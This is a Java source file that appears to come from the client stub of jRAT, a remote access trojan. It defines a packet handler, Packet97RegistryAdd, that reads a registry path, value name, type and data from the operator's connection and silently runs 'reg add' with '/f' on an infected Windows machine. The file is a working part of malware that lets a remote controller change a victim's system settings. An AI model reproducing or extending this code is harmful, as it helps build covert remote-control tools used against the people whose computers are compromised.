package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;

import com.redpois0n.oslib.OperatingSystem;

public class Packet97RegistryAdd extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String path = Connection.instance.readLine();
		String name = Connection.instance.readLine();
		String type = Connection.instance.readLine();
		String data = Connection.instance.readLine();
				
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { "reg", "add", path + "\\", "/v", name, "/t", type, "/d", data, "/f" });
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
